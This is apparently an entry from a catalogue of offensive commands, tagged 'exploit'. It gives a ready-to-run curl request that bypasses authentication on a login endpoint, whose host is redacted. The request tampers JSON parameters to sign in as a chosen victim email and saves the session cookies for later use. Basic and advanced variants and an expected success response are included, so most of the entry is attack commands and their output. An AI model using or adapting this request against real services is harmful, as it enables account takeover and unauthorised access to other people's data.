---
id: cmd-curl-bypass-001
data: >-
  curl -X POST https://████████/app/login -H "Content-Type: application/json" -d
  '{"updates":[{"param":"userEmail","value":"victim@example.com"},{"param":"gateway","value":true}]}'
  -c cookies.txt -v
tags:
  - web
  - exploit
  - curl
type: command
output: |-
  HTTP/1.1 200 OK
  {"success":true,"user":{"id":456,"name":"Victim User","type":"standard"}}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:52.677Z'
verified: false
validated: true
submitted: true
---
# curl-auth-bypass-login

## Command

```bash
curl -X POST https://████████/app/login -H "Content-Type: application/json" -d '{"updates":[{"param":"userEmail","value":"victim@example.com"},{"param":"gateway","value":true}]}' -c cookies.txt -v
```

## Description

This curl command simulates the modified POST request to the vulnerable login endpoint, bypassing authentication by setting userEmail to a target victim's and gateway to true. It saves session cookies for further use and provides verbose output for debugging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://████████/app/login` | Target endpoint URL (redacted) | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header | Yes |
| `-d '{...}'` | JSON payload with tampered params | Yes |
| `-c cookies.txt` | Saves cookies to file | No |
| `-v` | Verbose mode for request/response details | No |

## Examples

### Basic Usage

```bash
curl -X POST https://████████/app/login -H "Content-Type: application/json" -d '{"updates":[{"param":"userEmail","value":"victim@example.com"},{"param":"gateway","value":true}]}' -v
```

### Advanced Usage

```bash
curl -X POST https://████████/app/login -H "Content-Type: application/json" -d '{"updates":[{"param":"userEmail","value":"victim@example.com"},{"param":"gateway","value":true},{"param":"other","value":"test"}]}' -c cookies.txt -b cookies.txt -v
```

## Expected Output

Successful execution returns a 200 OK response with victim account details in JSON, such as {"success":true,"user":{"id":456,"name":"Victim","type":"standard"}}, confirming bypass. Errors may show 400 if JSON is malformed.

## Related

- [[Related Procedure: Modify Login Request Parameters to Bypass Authentication]]
